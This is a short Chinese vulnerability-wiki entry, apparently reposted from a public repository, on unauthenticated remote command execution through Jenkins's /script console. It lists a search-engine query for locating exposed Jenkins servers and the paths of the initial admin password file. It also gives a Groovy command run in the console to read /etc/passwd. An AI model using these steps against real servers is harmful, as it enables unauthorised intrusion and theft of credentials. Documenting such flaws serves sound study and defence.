---
title: "Jenkins script 未授权远程命令执行漏洞"
date: 2026-10-14 09:04:33
categories:
  - WebSecurity
  - CVE
  - "中间件"
  - "Jenkins"
tags:
  - "Jenkins"
  - "命令执行"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

Jenkins 登录后访问 /script 页面，其中存在命令执行漏洞，当存在未授权的情况时导致服务器被入侵

## 漏洞影响

```
Jenkins
```

## 网络测绘

```
app="Jenkins"
```

## 漏洞复现

账号密码存在于：

```
Linux: /var/lib/jenkins/secrets/initialAdminPassword
Windows: C:\Users\RabbitMask\.jenkins\secrets\initialAdminPassword
```

登录后台，或在未授权的情况下访问

```
http://xxx.xxx.xxx.xxx/script
```

在脚本命命令模块执行系统命令

```
println "cat /etc/passwd".execute().text
```

![image-20220525163148014](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202205251631073.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
